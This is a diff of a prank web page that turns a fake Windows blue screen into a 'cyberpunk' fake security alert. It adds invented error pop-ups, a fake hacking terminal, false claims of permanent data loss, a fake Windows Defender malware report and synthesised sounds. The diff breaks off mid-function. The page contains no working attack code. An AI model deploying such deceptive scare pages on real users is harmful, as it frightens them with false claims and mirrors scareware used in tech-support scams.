@@ -3,22 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Windows</title>
+    <title>System Security Alert</title>
     <style>
-        /* Styles pour les effets sonores */
-        .sound-btn {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.5);
-            color: white;
-            border: 1px solid white;
-            padding: 5px 10px;
-            cursor: pointer;
-            z-index: 10000;
-            font-size: 12px;
-            display: none;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap');
+        
         * {
             margin: 0;
             padding: 0;
@@ -27,183 +15,297 @@
         }
 
         body {
-            background: #0078d7;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: white;
+            background: #000000;
+            font-family: 'Share Tech Mono', monospace;
+            color: #00ff41;
             overflow: hidden;
             cursor: default;
         }
 
+        /* Effet de scanlines CRT */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15),
+                rgba(0, 0, 0, 0.15) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        /* Écran bleu initial - version cyberpunk */
         .bsod-container {
-            padding: 80px;
+            padding: 0;
             height: 100vh;
             display: flex;
             flex-direction: column;
+            background: linear-gradient(135deg, #0a0a1f 0%, #000000 100%);
+            position: relative;
+            overflow: hidden;
         }
 
-        .sad-face {
+        .bsod-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0,100,255,0.1) 0%, transparent 70%);
+            animation: pulse-bg 4s ease-in-out infinite;
+        }
+
+        @keyframes pulse-bg {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.6; }
+        }
+
+        .bsod-header {
+            background: linear-gradient(90deg, #0a0a1f 0%, #1a0a2e 50%, #0a0a1f 100%);
+            padding: 20px 40px;
+            border-bottom: 2px solid #ff0055;
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.5);
+        }
+
+        .bsod-header h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
+            color: #ff0055;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px rgba(255, 0, 85, 0.8);
+        }
+
+        .bsod-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 60px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .error-icon {
             font-size: 120px;
             margin-bottom: 40px;
-            font-weight: 300;
+            color: #ff0055;
+            text-shadow: 0 0 30px rgba(255, 0, 85, 1);
+            animation: glitch-icon 2s infinite;
         }
 
-        h1 {
+        @keyframes glitch-icon {
+            0%, 90%, 100% { 
+                transform: translate(0);
+                text-shadow: 0 0 30px rgba(255, 0, 85, 1);
+            }
+            92% { 
+                transform: translate(-3px, 3px);
+                text-shadow: -3px 0 #00ffff, 3px 0 #ff0055;
+            }
+            94% { 
+                transform: translate(3px, -3px);
+                text-shadow: 3px 0 #00ffff, -3px 0 #ff0055;
+            }
+        }
+
+        .error-title {
+            font-family: 'Orbitron', sans-serif;
             font-size: 42px;
-            font-weight: 300;
+            font-weight: 900;
             margin-bottom: 30px;
+            color: #ffffff;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            text-align: center;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
         }
 
-        .error-text {
-            font-size: 18px;
+        .error-subtitle {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 20px;
+            font-weight: 400;
+            color: #00d4ff;
+            text-align: center;
+            max-width: 700px;
             line-height: 1.6;
-            max-width: 600px;
             margin-bottom: 40px;
+            text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
         }
 
-        .progress-container {
-            margin-top: 40px;
+        .error-code-box {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #ff0055;
+            padding: 25px 40px;
+            margin-top: 30px;
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.3), inset 0 0 20px rgba(255, 0, 85, 0.1);
         }
 
-        .progress-text {
-            font-size: 16px;
-            margin-bottom: 10px;
-        }
-
-        .error-code {
-            margin-top: 60px;
+        .error-code-box p {
+            font-family: 'Share Tech Mono', monospace;
             font-size: 14px;
-            opacity: 0.8;
+            color: #00ff41;
+            margin: 8px 0;
         }
 
-        .qr-code {
-            position: absolute;
-            bottom: 80px;
-            right: 80px;
-            width: 150px;
-            height: 150px;
-            background: white;
-            padding: 10px;
+        .progress-bar-container {
+            width: 400px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            margin-top: 40px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #00d4ff;
+            box-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
         }
 
-        /* Fenêtre d'erreur Windows */
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00d4ff 0%, #ff0055 100%);
+            width: 0%;
+            animation: load-progress 3s ease-out forwards;
+            box-shadow: 0 0 10px rgba(0, 212, 255, 0.8);
+        }
+
+        @keyframes load-progress {
+            to { width: 100%; }
+        }
+
+        /* Fenêtres d'erreur - style cyberpunk */
         .error-window {
             position: fixed;
-            width: 400px;
-            background: #f0f0f0;
-            border: 1px solid #0078d7;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            width: 450px;
+            background: linear-gradient(135deg, #0a0a1f 0%, #1a0a2e 100%);
+            border: 2px solid #ff0055;
+            box-shadow: 0 0 40px rgba(255, 0, 85, 0.6), inset 0 0 30px rgba(0, 0, 0, 0.5);
             z-index: 1000;
-            animation: shake 0.3s;
+            animation: shake-window 0.2s;
+            font-family: 'Rajdhani', sans-serif;
         }
 
-        @keyframes shake {
+        @keyframes shake-window {
             0%, 100% { transform: translate(0, 0); }
-            25% { transform: translate(-5px, 0); }
-            75% { transform: translate(5px, 0); }
+            25% { transform: translate(-8px, 0); }
+            75% { transform: translate(8px, 0); }
         }
 
         .error-title-bar {
-            background: linear-gradient(180deg, #ffffff 0%, #e5e5e5 100%);
-            padding: 8px 10px;
+            background: linear-gradient(90deg, #ff0055 0%, #c40042 100%);
+            padding: 12px 15px;
             display: flex;
             align-items: center;
-            border-bottom: 1px solid #ccc;
-            cursor: move;
+            border-bottom: 1px solid #ff0055;
+            box-shadow: 0 2px 10px rgba(255, 0, 85, 0.5);
         }
 
         .error-icon-title {
-            width: 16px;
-            height: 16px;
-            margin-right: 6px;
+            font-size: 18px;
+            margin-right: 10px;
         }
 
         .error-title-text {
-            font-size: 12px;
-            color: #000;
+            font-size: 14px;
+            color: #ffffff;
             flex: 1;
-            font-weight: 600;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
         }
 
         .error-close-btn {
-            width: 16px;
-            height: 16px;
-            background: #e81123;
-            color: white;
-            border: none;
-            font-size: 10px;
+            width: 24px;
+            height: 24px;
+            background: #000;
+            color: #ff0055;
+            border: 1px solid #ff0055;
+            font-size: 16px;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: bold;
+            transition: all 0.2s;
         }
 
         .error-close-btn:hover {
-            background: #c50014;
+            background: #ff0055;
+            color: #000;
+            box-shadow: 0 0 10px rgba(255, 0, 85, 0.8);
         }
 
         .error-content {
-            padding: 20px;
-            background: white;
+            padding: 25px;
+            background: rgba(0, 0, 0, 0.4);
             display: flex;
-            gap: 15px;
+            gap: 20px;
+            align-items: flex-start;
         }
 
         .error-symbol {
-            font-size: 32px;
+            font-size: 40px;
             flex-shrink: 0;
+            filter: drop-shadow(0 0 10px currentColor);
         }
 
         .error-message {
-            color: #000;
-            font-size: 13px;
-            line-height: 1.4;
+            color: #00d4ff;
+            font-size: 15px;
+            line-height: 1.6;
+            font-weight: 500;
         }
 
         .error-buttons {
-            padding: 15px 20px;
-            background: #f0f0f0;
+            padding: 20px 25px;
+            background: rgba(0, 0, 0, 0.6);
             display: flex;
             justify-content: flex-end;
-            gap: 10px;
-            border-top: 1px solid #dfdfdf;
+            gap: 15px;
+            border-top: 1px solid rgba(255, 0, 85, 0.3);
         }
 
         .error-btn {
-            padding: 6px 20px;
-            background: linear-gradient(180deg, #ffffff 0%, #e5e5e5 100%);
-            border: 1px solid #adadad;
-            color: #000;
-            font-size: 11px;
+            padding: 10px 30px;
+            background: linear-gradient(135deg, #ff0055 0%, #c40042 100%);
+            border: 1px solid #ff0055;
+            color: #ffffff;
+            font-size: 13px;
             cursor: pointer;
-            min-width: 75px;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(255, 0, 85, 0.5);
         }
 
         .error-btn:hover {
-            background: linear-gradient(180deg, #e5f3ff 0%, #bee6fd 100%);
-            border: 1px solid #0078d7;
+            background: linear-gradient(135deg, #ff2a75 0%, #e60052 100%);
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.8);
+            transform: translateY(-2px);
         }
 
-        .error-btn:active {
-            background: #cce8ff;
-        }
-
-        .click-instruction {
-            display: none;
-        }
-
-        /* Écran noir de hacking */
+        /* Écran noir de hacking - cyberpunk */
         .hacking-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #000;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            padding: 40px;
+            background: #000000;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            padding: 30px;
             overflow-y: auto;
             display: none;
             z-index: 9999;
@@ -213,21 +315,37 @@
             display: block;
         }
 
+        .hacking-screen::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        .hacking-screen::-webkit-scrollbar-track {
+            background: #0a0a0a;
+            border-left: 1px solid #00ff41;
+        }
+
+        .hacking-screen::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            box-shadow: 0 0 10px #00ff41;
+        }
+
         .terminal-line {
-            margin: 3px 0;
+            margin: 2px 0;
             font-size: 14px;
+            line-height: 1.4;
+            text-shadow: 0 0 5px currentColor;
         }
 
         .terminal-line.red {
-            color: #ff0000;
+            color: #ff0055;
         }
 
         .terminal-line.yellow {
-            color: #ffff00;
+            color: #ffd700;
         }
 
         .terminal-line.cyan {
-            color: #00ffff;
+            color: #00d4ff;
         }
 
         .terminal-line.white {
@@ -244,86 +362,87 @@
             51%, 100% { opacity: 0; }
         }
 
-        .skull {
-            font-size: 80px;
-            text-align: center;
-            margin: 40px 0;
-            color: #ff0000;
-            text-shadow: 0 0 20px #ff0000;
-        }
-
-        .glitch-text {
-            animation: glitch-anim 0.3s infinite;
-        }
-
-        @keyframes glitch-anim {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
-        }
-
-        /* Deuxième écran bleu - destruction de données */
+        /* Écran bleu final - version cyberpunk */
         .final-bsod {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #0078d7;
+            background: linear-gradient(135deg, #0a0a1f 0%, #000000 100%);
             color: white;
-            padding: 80px;
+            padding: 60px;
             display: none;
             z-index: 10000;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Rajdhani', sans-serif;
+            overflow-y: auto;
         }
 
         .final-bsod.active {
             display: block;
         }
 
-        .final-bsod .sad-face {
-            font-size: 150px;
+        .final-bsod .skull-icon {
+            font-size: 180px;
+            text-align: center;
             margin-bottom: 40px;
-            font-weight: 300;
-            animation: shake-face 0.5s infinite;
+            color: #ff0055;
+            text-shadow: 0 0 40px rgba(255, 0, 85, 1);
+            animation: skull-pulse 2s infinite;
         }
 
-        @keyframes shake-face {
-            0%, 100% { transform: rotate(0deg); }
-            25% { transform: rotate(-5deg); }
-            75% { transform: rotate(5deg); }
+        @keyframes skull-pulse {
+            0%, 100% { 
+                transform: scale(1);
+                text-shadow: 0 0 40px rgba(255, 0, 85, 1);
+            }
+            50% { 
+                transform: scale(1.05);
+                text-shadow: 0 0 60px rgba(255, 0, 85, 1), 0 0 80px rgba(255, 0, 85, 0.5);
+            }
         }
 
         .final-bsod h1 {
-            font-size: 48px;
-            font-weight: 300;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 52px;
+            font-weight: 900;
             margin-bottom: 30px;
-            color: #ff0000;
-            text-shadow: 0 0 10px rgba(255,0,0,0.5);
+            color: #ff0055;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            text-shadow: 0 0 20px rgba(255, 0, 85, 1);
         }
 
         .final-bsod .error-details {
             font-size: 18px;
             line-height: 1.8;
-            margin-bottom: 30px;
-            max-width: 900px;
+            margin-bottom: 40px;
+            text-align: center;
+            color: #00d4ff;
+            max-width: 1000px;
+            margin-left: auto;
+            margin-right: auto;
         }
 
         .final-bsod .data-loss {
-            background: rgba(0,0,0,0.3);
-            padding: 30px;
-            margin: 30px 0;
-            border-left: 5px solid #ff0000;
-            max-width: 800px;
+            background: rgba(255, 0, 85, 0.1);
+            padding: 40px;
+            margin: 40px auto;
+            border: 2px solid #ff0055;
+            max-width: 900px;
+            box-shadow: 0 0 30px rgba(255, 0, 85, 0.5), inset 0 0 30px rgba(0, 0, 0, 0.5);
         }
 
         .final-bsod .data-loss h2 {
-            font-size: 24px;
-            color: #ff0000;
-            margin-bottom: 20px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            color: #ff0055;
+            margin-bottom: 25px;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 15px rgba(255, 0, 85, 0.8);
         }
 
         .final-bsod .data-loss ul {
@@ -332,105 +451,67 @@
         }
 
         .final-bsod .data-loss li {
-            padding: 8px 0;
+            padding: 12px 0;
             font-size: 16px;
-            border-bottom: 1px solid rgba(255,255,255,0.2);
+            border-bottom: 1px solid rgba(255, 0, 85, 0.3);
+            color: #ffffff;
+            font-weight: 500;
         }
 
         .final-bsod .data-loss li::before {
-            content: '❌ ';
-            color: #ff0000;
-            margin-right: 10px;
+            content: '⚠ ';
+            color: #ff0055;
+            margin-right: 15px;
+            font-size: 18px;
+            text-shadow: 0 0 10px rgba(255, 0, 85, 1);
         }
 
         .final-bsod .warning-message {
-            font-size: 20px;
-            color: #ffff00;
-            margin-top: 40px;
+            font-size: 22px;
+            color: #ffd700;
+            margin-top: 50px;
+            text-align: center;
             animation: pulse-warning 1.5s infinite;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
         }
 
         @keyframes pulse-warning {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+            50% { opacity: 0.6; }
         }
 
         .final-bsod .stop-code {
-            margin-top: 50px;
+            margin-top: 60px;
+            text-align: center;
             font-size: 14px;
-            opacity: 0.8;
+            opacity: 0.7;
+            font-family: 'Share Tech Mono', monospace;
+            color: #00ff41;
         }
     </style>
 </head>
 <body>
-    <!-- Écran bleu de la mort -->
-    <div class="bsod-container">
-        <div class="sad-face">:(</div>
-        <h1>Votre PC a rencontré un problème et doit redémarrer.</h1>
-        <div class="error-text">
-            Nous collectons simplement des informations relatives aux erreurs, puis nous<br>
-            procéderons au redémarrage pour vous. (0% effectués)
+    <!-- Écran bleu initial cyberpunk -->
+    <div id="errorScreen" class="bsod-container">
+        <div class="bsod-header">
+            <h1>⚠ System Security Alert</h1>
         </div>
-        <div class="progress-container">
-            <div class="progress-text"><span id="progress">0</span>% effectués</div>
-        </div>
-        <div class="error-code">
-            Si vous souhaitez en savoir plus, vous pouvez rechercher cette erreur en ligne<br>
-            ultérieurement : CRITICAL_PROCESS_DIED
-        </div>
-        <div class="qr-code">
-            <svg viewBox="0 0 100 100">
-                <rect width="100" height="100" fill="white"/>
-                <g fill="black">
-                    <rect x="10" y="10" width="5" height="5"/>
-                    <rect x="20" y="10" width="5" height="5"/>
-                    <rect x="25" y="10" width="5" height="5"/>
-                    <rect x="35" y="10" width="5" height="5"/>
-                    <rect x="45" y="10" width="5" height="5"/>
-                    <rect x="55" y="10" width="5" height="5"/>
-                    <rect x="65" y="10" width="5" height="5"/>
-                    <rect x="75" y="10" width="5" height="5"/>
-                    <rect x="85" y="10" width="5" height="5"/>
-                    <rect x="10" y="20" width="5" height="5"/>
-                    <rect x="30" y="20" width="5" height="5"/>
-                    <rect x="50" y="20" width="5" height="5"/>
-                    <rect x="70" y="20" width="5" height="5"/>
-                    <rect x="85" y="20" width="5" height="5"/>
-                    <rect x="10" y="30" width="5" height="5"/>
-                    <rect x="25" y="30" width="5" height="5"/>
-                    <rect x="40" y="30" width="5" height="5"/>
-                    <rect x="60" y="30" width="5" height="5"/>
-                    <rect x="85" y="30" width="5" height="5"/>
-                    <rect x="10" y="40" width="5" height="5"/>
-                    <rect x="20" y="40" width="5" height="5"/>
-                    <rect x="35" y="40" width="5" height="5"/>
-                    <rect x="55" y="40" width="5" height="5"/>
-                    <rect x="70" y="40" width="5" height="5"/>
-                    <rect x="85" y="40" width="5" height="5"/>
-                    <rect x="15" y="50" width="5" height="5"/>
-                    <rect x="30" y="50" width="5" height="5"/>
-                    <rect x="45" y="50" width="5" height="5"/>
-                    <rect x="65" y="50" width="5" height="5"/>
-                    <rect x="80" y="50" width="5" height="5"/>
-                    <rect x="10" y="60" width="5" height="5"/>
-                    <rect x="25" y="60" width="5" height="5"/>
-                    <rect x="40" y="60" width="5" height="5"/>
-                    <rect x="60" y="60" width="5" height="5"/>
-                    <rect x="75" y="60" width="5" height="5"/>
-                    <rect x="85" y="60" width="5" height="5"/>
-                    <rect x="10" y="70" width="5" height="5"/>
-                    <rect x="20" y="70" width="5" height="5"/>
-                    <rect x="35" y="70" width="5" height="5"/>
-                    <rect x="50" y="70" width="5" height="5"/>
-                    <rect x="70" y="70" width="5" height="5"/>
-                    <rect x="85" y="70" width="5" height="5"/>
-                    <rect x="15" y="80" width="5" height="5"/>
-                    <rect x="30" y="80" width="5" height="5"/>
-                    <rect x="45" y="80" width="5" height="5"/>
-                    <rect x="60" y="80" width="5" height="5"/>
-                    <rect x="80" y="80" width="5" height="5"/>
-                </g>
-            </svg>
+        <div class="bsod-content">
+            <div class="error-icon">⚠</div>
+            <div class="error-title">Critical System Failure</div>
+            <div class="error-subtitle">
+                Your system has encountered a critical security breach.<br>
+                All protective measures have been compromised.<br>
+                Emergency shutdown protocol initiated.
+            </div>
+            <div class="error-code-box">
+                <p>ERROR CODE: 0xC000021A</p>
+                <p>FAILED MODULE: ntoskrnl.exe</p>
+                <p>STATUS: CRITICAL_PROCESS_DIED</p>
+            </div>
+            <div class="progress-bar-container">
+                <div class="progress-bar"></div>
+            </div>
         </div>
     </div>
 
@@ -439,171 +520,468 @@
         <div id="hackTerminal"></div>
     </div>
 
-    <!-- Écran bleu final - destruction de données -->
+    <!-- Écran bleu final -->
     <div class="final-bsod" id="finalBsod">
-        <div class="sad-face">:(</div>
-        <h1>ERREUR CRITIQUE : CORRUPTION TOTALE DU SYSTÈME</h1>
+        <div class="skull-icon">☠</div>
+        <h1>System Corruption Detected</h1>
         <div class="error-details">
-            Votre PC a subi une attaque malveillante qui a endommagé de façon irréversible<br>
-            les fichiers système critiques. Windows ne peut plus démarrer normalement.
+            Your system has been compromised by an advanced persistent threat.<br>
+            Critical system files have been irreversibly corrupted.<br>
+            Recovery is not possible with standard methods.
         </div>
         
         <div class="data-loss">
-            <h2>⚠️ DONNÉES DÉTRUITES DE MANIÈRE PERMANENTE :</h2>
+            <h2>⚠ Permanent Data Loss Detected</h2>
             <ul>
-                <li>Tous les documents personnels (Documents, Bureau, Téléchargements)</li>
-                <li>Photos et vidéos (0 fichiers récupérables sur 3,847)</li>
-                <li>Mots de passe et identifiants de connexion</li>
-                <li>Historique de navigation et cookies</li>
-                <li>Fichiers Microsoft Office (Word, Excel, PowerPoint)</li>
-                <li>Emails et contacts</li>
-                <li>Applications installées et leurs données</li>
-                <li>Fichiers système Windows (C:\Windows\System32\)</li>
-                <li>Partitions de disque dur (Secteurs de boot corrompus)</li>
+                <li>All personal documents and files (Documents, Desktop, Downloads)</li>
+                <li>Photo and video archives (0 recoverable files from 3,847 total)</li>
+                <li>Stored authentication credentials and passwords</li>
+                <li>Browser history, cookies, and cached data</li>
+                <li>Microsoft Office documents (Word, Excel, PowerPoint)</li>
+                <li>Email databases and contact lists</li>
+                <li>Installed applications and program data</li>
+                <li>Windows system files (C:\Windows\System32\)</li>
+                <li>Boot sector and partition table data</li>
             </ul>
         </div>
 
         <div class="error-details">
-            <strong>RAPPORT DE WINDOWS DEFENDER :</strong><br><br>
-            L'analyse antivirus a détecté une menace de niveau critique (Trojan:Win32/Wacatac.H!ml)<br>
-            mais n'a PAS pu la neutraliser. Le malware s'est propagé dans les fichiers système<br>
-            avant que la quarantaine ne soit établie.
+            <strong>WINDOWS DEFENDER SECURITY REPORT:</strong><br><br>
+            Advanced malware detected (Trojan:Win32/Wacatac.H!ml - APT Level)<br>
+            Quarantine failed. Malware propagated to core system files before containment.<br>
+            All recovery options have been exhausted.
             <br><br>
-            <strong style="color: #ff0000;">❌ Échec de la récupération : 0 fichiers sauvegardés</strong><br>
-            <strong style="color: #ff0000;">❌ Points de restauration système : Tous corrompus</strong><br>
-            <strong style="color: #ff0000;">❌ Sauvegarde Cloud : Synchronisation échouée</strong>
+            <strong style="color: #ff0055;">⚠ System Restore: All restore points corrupted</strong><br>
+            <strong style="color: #ff0055;">⚠ File Recovery: 0 files successfully recovered</strong><br>
+            <strong style="color: #ff0055;">⚠ Cloud Backup: Synchronization failed</strong>
         </div>
 
         <div class="warning-message">
-            ⚠️ AVERTISSEMENT : Toute tentative de redémarrage pourrait endommager<br>
-            davantage le matériel. Une réinstallation complète de Windows est requise.
+            ⚠ WARNING: System integrity compromised beyond repair<br>
+            Complete OS reinstallation required
         </div>
 
         <div class="stop-code">
-            Code d'arrêt : CRITICAL_SYSTEM_CORRUPTION<br>
-            Échec : ntoskrnl.exe<br>
+            STOP CODE: CRITICAL_SYSTEM_CORRUPTION<br>
+            FAILED: ntoskrnl.exe<br>
             0x000000EF (0x0000000000000001, 0x0000000000000000, 0x0000000000000000)
         </div>
     </div>
 
     <script>
         let errorCount = 0;
-        let progressValue = 0;
         let clickHappened = false;
         let hackingStarted = false;
-        const progressElement = document.getElementById('progress');
 
-        // Messages d'erreur variés
+        // Messages d'erreur cyberpunk
         const errorMessages = [
             {
-                title: "Erreur système",
-                message: "Une erreur critique s'est produite. Le système doit redémarrer immédiatement.",
-                icon: "❌"
+                title: "System Failure",
+                message: "Critical kernel panic detected. System stability compromised. Immediate shutdown recommended.",
+                icon: "⚠"
             },
             {
-                title: "Windows",
-                message: "L'opération n'a pas pu être terminée car le fichier système est introuvable.",
-                icon: "⚠️"
-            },
-            {
-                title: "Erreur d'application",
-                message: "explorer.exe a cessé de fonctionner. Windows recherche une solution au problème...",
-                icon: "❌"
-            },
-            {
-                title: "Gestionnaire des tâches",
-                message: "Mémoire insuffisante. Fermez certaines applications pour libérer de la mémoire.",
-                icon: "⚠️"
-            },
-            {
-                title: "Windows Update",
-                message: "La mise à jour KB4023057 n'a pas pu être installée. Code d'erreur: 0x80070002",
-                icon: "❌"
-            },
-            {
-                title: "Erreur critique",
-                message: "Le processus système critique C:\\Windows\\system32\\csrss.exe a échoué avec le code d'état 0xC000021A.",
-                icon: "🛑"
-            },
-            {
-                title: "Disque dur",
-                message: "SMART a détecté que le disque est sur le point de tomber en panne. Sauvegardez vos données immédiatement.",
-                icon: "⚠️"
-            },
-            {
-                title: "Windows Defender",
-                message: "Menace détectée! Trojan:Win32/Wacatac.B!ml a été trouvé sur votre système.",
+                title: "Security Alert",
+                message: "Unauthorized access detected. Firewall has been breached. All security protocols disabled.",
                 icon: "🛡️"
             },
             {
-                title: "Registre Windows",
-                message: "Le registre système est corrompu. Exécutez sfc /scannow pour réparer.",
-                icon: "❌"
+                title: "Memory Violation",
+                message: "Fatal exception 0xC0000005 in module ntdll.dll. Memory corruption detected at 0x7FFE0000.",
+                icon: "⚠"
             },
             {
-                title: "Carte graphique",
-                message: "Le pilote d'affichage a cessé de répondre et a été récupéré.",
-                icon: "⚠️"
+                title: "Driver Error",
+                message: "DRIVER_IRQL_NOT_LESS_OR_EQUAL. Critical system driver has stopped responding.",
+                icon: "⚠"
             },
             {
-                title: "Microsoft Office",
-                message: "Word a rencontré une erreur et doit fermer. Vos modifications non enregistrées seront perdues.",
-                icon: "❌"
+                title: "Antivirus Alert",
+                message: "Trojan.Generic.KD.65432108 detected. Quarantine failed. Malware is active in memory.",
+                icon: "☠"
             },
             {
-                title: "Réseau",
-                message: "La connexion réseau a été interrompue de manière inattendue. Vérifiez votre câble Ethernet.",
+                title: "Disk Failure",
+                message: "S.M.A.R.T. status: CRITICAL. Disk failure imminent. Backup all data immediately.",
+                icon: "💾"
+            },
+            {
+                title: "Network Breach",
+                message: "Unauthorized connection to port 4444. Remote access trojan detected and active.",
                 icon: "🌐"
             },
             {
-                title: "Batterie",
-                message: "Considérez le remplacement de votre batterie. La batterie ne se charge plus correctement.",
-                icon: "🔋"
+                title: "System Corruption",
+                message: "Boot sector corruption detected. MBR has been modified. System may not restart.",
+                icon: "⚠"
             },
             {
-                title: "Erreur DLL",
-                message: "Le programme ne peut pas démarrer car MSVCP140.dll est introuvable sur votre ordinateur.",
-                icon: "❌"
-            },
-            {
-                title: "Écran bleu",
-                message: "DRIVER_IRQL_NOT_LESS_OR_EQUAL. Votre système va redémarrer dans 60 secondes.",
+                title: "Kernel Panic",
+                message: "KERNEL_DATA_INPAGE_ERROR. Critical system process terminated unexpectedly.",
                 icon: "💀"
             },
             {
-                title: "Accès refusé",
-                message: "Vous n'avez pas les autorisations nécessaires pour effectuer cette opération.",
-                icon: "🚫"
+                title: "Registry Error",
+                message: "HKEY_LOCAL_MACHINE corrupted. System registry is unstable. OS reinstall required.",
+                icon: "⚠"
             },
             {
-                title: "Virus détecté",
-                message: "Attention! Un rootkit a été détecté sur votre système. Action immédiate requise!",
-                icon: "☠️"
+                title: "Memory Dump",
+                message: "Physical memory dump in progress. Critical error logged. System will restart.",
+                icon: "⚠"
             },
             {
-                title: "Erreur fatale",
-                message: "KERNEL_DATA_INPAGE_ERROR - Le système ne peut pas lire le fichier de pagination.",
-                icon: "❌"
+                title: "Process Violation",
+                message: "lsass.exe has stopped working. Authentication services compromised.",
+                icon: "⚠"
             }
         ];
 
-        // Animation de la barre de progression
-        setInterval(() => {
-            if (progressValue < 100) {
-                progressValue += Math.random() * 2;
-                if (progressValue > 100) progressValue = 100;
-                progressElement.textContent = Math.floor(progressValue);
+        // Sons ultra réalistes
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        let audioContext;
+        
+        function initAudio() {
+            if (!audioContext) {
+                audioContext = new AudioContext();
             }
-        }, 1000);
+        }
 
-        // Fonction pour créer une fenêtre d'erreur
+        // Son d'erreur système professionnel
+        function playErrorBeep() {
+            if (!audioContext) return;
+            
+            const osc = audioContext.createOscillator();
+            const gain = audioContext.createGain();
+            const filter = audioContext.createBiquadFilter();
+            
+            osc.connect(filter);
+            filter.connect(gain);
+            gain.connect(audioContext.destination);
+            
+            osc.frequency.value = 880;
+            osc.type = 'sine';
+            filter.type = 'lowpass';
+            filter.frequency.value = 2000;
+            
+            gain.gain.setValueAtTime(0.12, audioContext.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.15);
+            
+            osc.start(audioContext.currentTime);
+            osc.stop(audioContext.currentTime + 0.15);
+        }
+
+        // Son de frappe clavier mécanique ultra réaliste
+        function playKeyboardSound() {
+            if (!audioContext) return;
+            
+            // Simuler le clic mécanique d'un switch Cherry MX
+            const clickFreq = 3000 + Math.random() * 1000;
+            const releaseFreq = 2000 + Math.random() * 500;
+            
+            // Son du "click" (appui)
+            const clickOsc = audioContext.createOscillator();
+            const clickGain = audioContext.createGain();
+            const clickFilter = audioContext.createBiquadFilter();
+            
+            clickOsc.connect(clickFilter);
+            clickFilter.connect(clickGain);
+            clickGain.connect(audioContext.destination);
+            
+            clickOsc.frequency.value = clickFreq;
+            clickOsc.type = 'square';
+            clickFilter.type = 'bandpass';
+            clickFilter.frequency.value = 3000;
+            clickFilter.Q.value = 5;
+            
+            clickGain.gain.setValueAtTime(0.08, audioContext.currentTime);
+            clickGain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.01);
+            
+            clickOsc.start(audioContext.currentTime);
+            clickOsc.stop(audioContext.currentTime + 0.01);
+            
+            // Son du "clack" (relâchement) - légèrement décalé
+            setTimeout(() => {
+                const releaseOsc = audioContext.createOscillator();
+                const releaseGain = audioContext.createGain();
+                const releaseFilter = audioContext.createBiquadFilter();
+                
+                releaseOsc.connect(releaseFilter);
+                releaseFilter.connect(releaseGain);
+                releaseGain.connect(audioContext.destination);
+                
+                releaseOsc.frequency.value = releaseFreq;
+                releaseOsc.type = 'square';
+                releaseFilter.type = 'bandpass';
+                releaseFilter.frequency.value = 2500;
+                releaseFilter.Q.value = 4;
+                
+                releaseGain.gain.setValueAtTime(0.05, audioContext.currentTime);
+                releaseGain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.008);
+                
